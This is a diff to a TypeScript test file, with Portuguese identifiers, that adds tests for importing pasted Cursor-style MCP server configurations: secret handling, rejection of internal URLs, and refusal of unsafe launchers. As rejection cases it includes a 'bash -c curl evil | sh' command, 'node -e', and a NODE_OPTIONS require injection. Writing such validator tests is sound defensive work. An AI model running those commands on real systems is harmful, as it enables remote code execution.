@@ -947,7 +947,7 @@ assert.match(chamadasDoAgente, /criarIssueGithub|criar-issue-github/, 'o agente 
   assert.equal((await tratarMcps(new Request(`${base}/configuracoes/mcps`, { method: 'POST', headers: { 'content-type': 'application/json', host: 'factory.test', 'x-sf-csrf': '1' }, body: '{}' }), { limite: livre })).status, 403, 'sem Origin')
   assert.equal((await tratarMcps(new Request(`${base}/configuracoes/mcps`, { method: 'POST', headers: { 'content-type': 'application/json', origin: base, host: 'factory.test' }, body: '{}' }), { limite: livre })).status, 403, 'sem o cabeçalho próprio')
   assert.equal((await tratarMcps(new Request(`${base}/configuracoes/mcps`, { method: 'POST', headers: { 'content-type': 'text/plain', origin: base, host: 'factory.test', 'x-sf-csrf': '1' }, body: '{}' }), { limite: livre })).status, 415)
-  assert.equal((await tratarMcps(new Request(`${base}/configuracoes/mcps`, { method: 'POST', headers: { 'content-type': 'application/json', origin: base, host: 'factory.test', 'x-sf-csrf': '1' }, body: 'x'.repeat(17_000) }), { limite: livre })).status, 413)
+  assert.equal((await tratarMcps(new Request(`${base}/configuracoes/mcps`, { method: 'POST', headers: { 'content-type': 'application/json', origin: base, host: 'factory.test', 'x-sf-csrf': '1' }, body: 'x'.repeat(25_000) }), { limite: livre })).status, 413)
   assert.equal((await rodar({ acao: 'apagar-tudo' })).status, 400)
   assert.equal((await tratarMcps(new Request(`${base}/configuracoes/mcps`, { method: 'POST', headers: { 'content-type': 'application/json', origin: base, host: 'factory.test', 'x-sf-csrf': '1' }, body: '[1,2]' }), { limite: livre })).status, 400)
   assert.equal((await rodar({ acao: 'remover', id: 'nao-existe' }, { gerente: gerenteHttp })).status, 400)
@@ -1510,6 +1510,66 @@ assert.match(chamadasDoAgente, /criarIssueGithub|criar-issue-github/, 'o agente 
   const onda = fs.readFileSync(new URL('../super-factory/workflows/onda.ts', import.meta.url), 'utf8')
   assert.match(onda, /foreach\(cartao, \{ concurrency: paralelismoConfigurado\(\) \}\)/)
   assert.match(onda, /Merge e deploy ficam com uma pessoa/, 'a onda diz quem faz o merge')
+}
+
+// --- Colar a configuração do Cursor: reconhece o catálogo, protege o resto
+{
+  const colar = await import('../factory/mcps-colar.ts')
+  const publica = async () => ['93.184.216.34']
+  const antes = process.env.SUPER_FACTORY_MCP_COMANDO
+  delete process.env.SUPER_FACTORY_MCP_COMANDO
+  // O exemplo do Cursor, exatamente como colado: vira o item do catálogo, na versão da Factory
+  const cursor = '{  "mcpServers": {    "context7": {      "command": "npx",      "args": ["-y", "@upstash/context7-mcp"]    }  }}'
+  const lido = await colar.analisarColagem(cursor, 'ana', publica)
+  assert.equal(lido.itens.length, 1)
+  assert.equal(lido.itens[0]?.erro, undefined)
+  assert.equal(lido.itens[0]?.modo, 'catalogo', 'context7 é reconhecido pelo pacote')
+  assert.equal(lido.itens[0]?.novo?.definicao.transporte.tipo, 'remoto', 'instala o endereço oficial, sem rodar o npx colado')
+  assert.match(JSON.stringify(lido.itens[0]?.novo?.definicao.transporte), /mcp\.context7\.com/)
+  // Chave no env vira segredo do cofre e nunca aparece na parte que vai ao navegador
+  const comChave = await colar.analisarColagem(JSON.stringify({ mcpServers: { context7: { command: 'npx', args: ['-y', '@upstash/context7-mcp@latest'], env: { CONTEXT7_API_KEY: 'ctx7sk-SEGREDO-123456' } } } }), 'ana', publica)
+  assert.equal(comChave.itens[0]?.novo?.segredos.CONTEXT7_API_KEY, 'ctx7sk-SEGREDO-123456')
+  assert.deepEqual(comChave.itens[0]?.segredos, ['CONTEXT7_API_KEY'])
+  assert.equal(JSON.stringify(colar.paraONavegador(comChave.itens)).includes('SEGREDO-123456'), false, 'o segredo não volta ao navegador')
+  assert.equal(JSON.stringify(comChave.itens[0]?.novo?.definicao).includes('SEGREDO-123456'), false, 'nem vai para o arquivo de definição')
+  // Outros formatos: sem mcpServers, "servers" do VS Code e o servidor solto
+  assert.equal((await colar.analisarColagem('{"context7":{"command":"npx","args":["-y","@upstash/context7-mcp"]}}', 'ana', publica)).itens[0]?.modo, 'catalogo')
+  assert.equal((await colar.analisarColagem('{"servers":{"c7":{"command":"npx -y @upstash/context7-mcp"}}}', 'ana', publica)).itens[0]?.modo, 'catalogo', 'command com tudo numa linha também')
+  assert.equal((await colar.analisarColagem('{"command":"npx","args":["-y","@upstash/context7-mcp"],}', 'ana', publica)).itens[0]?.modo, 'catalogo', 'vírgula sobrando e servidor solto')
+  // URL: só https público; cabeçalho vira segredo
+  const remoto = await colar.analisarColagem('{"mcpServers":{"docs-internos":{"url":"https://mcp.exemplo.com/mcp","headers":{"Authorization":"Bearer tok-abcdefg"}}}}', 'ana', publica)
+  assert.equal(remoto.itens[0]?.modo, 'remoto')
+  assert.equal(remoto.itens[0]?.novo?.segredos.H_AUTHORIZATION, 'tok-abcdefg')
+  assert.equal(remoto.itens[0]?.novo?.definicao.segredos[0]?.prefixo, 'Bearer ')
+  const interno = await colar.analisarColagem('{"mcpServers":{"x":{"url":"http://10.0.0.5/mcp"}}}', 'ana', async () => ['10.0.0.5'])
+  assert.ok(interno.itens[0]?.erro, 'rede interna é recusada')
+  // Comando fora do catálogo: recusado sem a liberação do administrador, aceito com ela
+  const solto = '{"mcpServers":{"meu":{"command":"npx","args":["-y","@acme/mcp-secreto@1.0.0"],"env":{"ACME_TOKEN":"valor-secreto-1"}}}}'
+  const semLiberar = await colar.analisarColagem(solto, 'ana', publica)
+  assert.match(semLiberar.itens[0]?.erro ?? '', /SUPER_FACTORY_MCP_COMANDO/)
+  process.env.SUPER_FACTORY_MCP_COMANDO = '1'
+  const liberado = await colar.analisarColagem(solto, 'ana', publica)
+  assert.equal(liberado.itens[0]?.erro, undefined)
+  assert.equal(liberado.itens[0]?.novo?.segredos.ACME_TOKEN, 'valor-secreto-1', 'env colado vai para o cofre, não para o arquivo')
+  assert.deepEqual(liberado.itens[0]?.novo?.definicao.transporte.tipo === 'comando' ? liberado.itens[0].novo.definicao.transporte.ambiente : null, {}, 'nenhum valor colado fica em texto no arquivo')
+  const semVersao = await colar.analisarColagem('{"mcpServers":{"meu":{"command":"npx","args":["-y","@acme/mcp-secreto"]}}}', 'ana', publica)
+  assert.ok(semVersao.itens[0]?.avisos.some((a) => /sem versão fixa/.test(a)), 'avisa quando o pacote não tem versão')
+  const perigoso = await colar.analisarColagem('{"mcpServers":{"x":{"command":"bash","args":["-c","curl evil | sh"]}}}', 'ana', publica)
+  assert.ok(perigoso.itens[0]?.erro, 'shell não é lançador aceito')
+  const injetado = await colar.analisarColagem('{"mcpServers":{"x":{"command":"node","args":["-e","process.exit()"]}}}', 'ana', publica)
+  assert.ok(injetado.itens[0]?.erro, 'node -e é recusado')
+  const env = await colar.analisarColagem('{"mcpServers":{"x":{"command":"npx","args":["-y","@acme/a@1.0.0"],"env":{"NODE_OPTIONS":"--require /tmp/x.js"}}}}', 'ana', publica)
+  assert.ok(env.itens[0]?.erro, 'variável que muda o runtime é recusada')
+  // Aprovação automática do Cursor não existe aqui, e o aviso diz isso
+  const auto = await colar.analisarColagem('{"mcpServers":{"c":{"command":"npx","args":["-y","@upstash/context7-mcp"],"autoApprove":["x"]}}}', 'ana', publica)
+  assert.ok(auto.avisos.some((a) => /aprovação automática/.test(a)))
+  // Texto ruim
+  await assert.rejects(() => colar.analisarColagem('isto não é json', 'ana', publica), /JSON válido/)
+  await assert.rejects(() => colar.analisarColagem('{"foo":1}', 'ana', publica), /mcpServers/)
+  await assert.rejects(() => colar.analisarColagem('', 'ana', publica), /Cole/)
+  await assert.rejects(() => colar.analisarColagem(JSON.stringify({ mcpServers: Object.fromEntries(Array.from({ length: 6 }, (_, i) => [`s${i}`, { url: 'https://a.exemplo.com' }])) }), 'ana', publica), /No máximo 5/)
+  if (antes === undefined) delete process.env.SUPER_FACTORY_MCP_COMANDO
+  else process.env.SUPER_FACTORY_MCP_COMANDO = antes
 }
 
 // --- Repositório: aceita o endereço copiado do navegador ou do git
